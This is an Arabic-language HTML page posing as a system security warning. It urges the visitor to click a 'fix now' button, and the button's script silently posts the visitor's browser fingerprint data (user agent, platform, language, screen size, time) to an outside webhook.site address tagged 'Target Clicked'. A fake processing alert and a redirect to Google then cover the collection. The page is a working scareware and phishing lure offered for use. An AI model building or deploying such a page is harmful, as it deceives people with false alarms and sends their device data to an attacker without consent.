<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>System Warning</title>
    <style>
        body { background-color: black; color: red; text-align: center; font-family: Arial, sans-serif; padding-top: 100px; }
        .warning-box { border: 2px solid red; display: inline-block; padding: 20px; border-radius: 10px; }
        button { background-color: red; color: white; padding: 15px 30px; font-size: 20px; cursor: pointer; border: none; border-radius: 5px; font-weight: bold; }
        button:hover { background-color: darkred; }
    </style>
</head>
<body>

    <div class="warning-box">
        <h1>⚠️ تحذير أمني ⚠️</h1>
        <p>تم اكتشاف نشاط مشبوه في جهازك. يرجى الضغط على الزر أدناه لإصلاح الخلل فوراً.</p>
        <button onclick="sendData()">موافق / إصلاح الآن</button>
    </div>

    <script>
        function sendData() {
            // رابط الـ Webhook الخاص بك لاستقبال البيانات
            const webhookUrl = "https://webhook.site/7ca94175-3600-4d49-9f32-b13d51122dfd";
            
            const data = {
                event: "Target Clicked",
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: window.screen.width + "x" + window.screen.height,
                time: new Date().toISOString()
            };

            fetch(webhookUrl, {
                method: 'POST',
                mode: 'no-cors', 
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).then(() => {
                alert("جاري معالجة الطلب... يرجى الانتظار");
                window.location.href = "https://google.com"; 
            }).catch(err => {
                alert("حدث خطأ في الاتصال");
            });
        }
    </script>
</body>
</html>
